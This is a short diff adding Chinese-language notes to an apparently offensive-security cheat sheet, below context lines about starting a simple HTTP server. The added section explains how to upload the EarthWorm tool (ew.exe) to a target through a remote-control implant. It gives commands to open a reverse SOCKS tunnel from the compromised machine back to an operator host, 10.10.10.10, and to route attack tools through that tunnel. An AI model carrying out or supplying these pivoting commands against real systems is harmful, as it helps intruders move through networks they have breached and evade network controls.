@@ -59,3 +59,20 @@ python -m SimpleHTTPServer 8080
 3
 python3 -m http.server
 ```
+
+
+## ew
+
+http://rootkiter.com/EarthWorm
+
+通过远控上传ew.exe
+然后在本地执行：ew.exe -s rcsocks -l 1008 -e 888
+说明：监听888端口，把接收到的数据转到本地的1008端口。
+
+在目标上执行ew.exe -s rssocks -d 10.10.10.10 -e 888
+说明：开启sockes 并反弹到ip地址为10.10.10.10 端口为888
+反弹代理成功以后，本地会出现rssocks cmd_socket ok!
+
+现在打开我们的SocksCap64，新建一个代理。
+ip为127.0.0.1端口为1008，配置好了以后，点击保存。
+现在我们把需要走代理的工具都放到SocksCap64里面。
